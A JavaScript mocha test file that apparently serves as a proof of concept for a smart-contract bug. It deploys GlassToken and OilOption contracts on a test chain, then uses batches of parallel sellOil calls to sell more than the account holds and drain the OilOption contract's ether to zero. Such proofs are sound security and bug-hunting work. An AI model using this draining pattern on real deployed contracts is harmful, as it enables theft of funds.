const contracts = require('../modules/contracts')
const chaithereum = require('chaithereum')

before(() => {
  return chaithereum.promise
})

describe('GlassHunt', () => {

  let glassToken;
  let oilOption;
  describe('setup', () => {
    it('successfully instantiates glassToken', () => {
      return chaithereum.web3.eth.contract(contracts.GlassToken.abi).new
      .q({ data: contracts.GlassToken.bytecode }).should.eventually.be.contract
      .then((_glassToken) => {
        glassToken = _glassToken
      }).should.be.fulfilled
    })

    it('should give the creator all the money', () => {
      return glassToken.balanceOf.q(chaithereum.account)
      .should.eventually.be.bignumber.equal(50600000)
    })

    it('successfully instantiates oil', () => {
      return chaithereum.web3.eth.contract(contracts.OilOption.abi).new
      .q({ data: contracts.OilOption.bytecode }).should.eventually.be.contract
      .then((_oilOption) => {
        oilOption = _oilOption
      }).should.be.fulfilled
    })

    it('should give a bounty of 100000 eth to oilOption', () => {
      return chaithereum.web3.eth.sendTransaction
      .q({to: oilOption.address, value: 100000}).should.eventually.be.fulfilled
    })

    it('should have the bounty in the oilOption', () => {
      return chaithereum.web3.eth.getBalance
      .q(oilOption.address).should.eventually.be.bignumber.equal(100000)
    })

    it('should set the watch addr', () => {
      return oilOption.setWatchAddr.q(glassToken.address).should.eventually.be.fulfilled;
    })

    it('should transfer money to the oilOption', () => {
      return glassToken.transfer.q(oilOption.address, 50600000).should.eventually.be.fulfilled
    })
  })

  describe('normal usage', () => {
    it('should buy 40 barrels of oil', () => {
      return oilOption.buyOil.q({
        from:  chaithereum.accounts[1],
        value: 16360,
      }).should.eventually.be.fulfilled
    })

    it('should definitely have given out 40 barrels', () => {
      return oilOption.balanceCrudeOf1.q(chaithereum.accounts[1])
      .should.eventually.be.bignumber.equal(40)
    })
  })

  describe('the exploit', () => {

    it('should sell 21 barrels one at a time', () => {
      return chaithereum.web3.Q.all([
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(409, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
      ])
    })

    it('should only have 19 of our barrels left', () => {
      return oilOption.balanceCrudeOf1.q(chaithereum.accounts[1])
      .should.eventually.be.bignumber.equal(19)
    })

    it('should sell the rest of our holdings', () => {
      return oilOption.sellOil.q(7771, {from: chaithereum.accounts[1]})
      .should.eventually.be.fulfilled
    })

    it('should only have 19 of our barrels left (BWAHAHAHAHAHAHA)', () => {
      return oilOption.balanceCrudeOf1.q(chaithereum.accounts[1])
      .should.eventually.be.bignumber.equal(19)
    })

    it('should take more than we deserve ;)', () => {
      //20 transactions to drain the contract
      return chaithereum.web3.Q.all([
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
        oilOption.sellOil.q(5000, {from: chaithereum.accounts[1]}).should.eventually.be.fulfilled,
      ])
    })

    it('should have no money in the oilOption QED', () => {
      return chaithereum.web3.eth.getBalance.q(oilOption.address)
      .should.eventually.be.bignumber.equal(0)
    })
  })
})
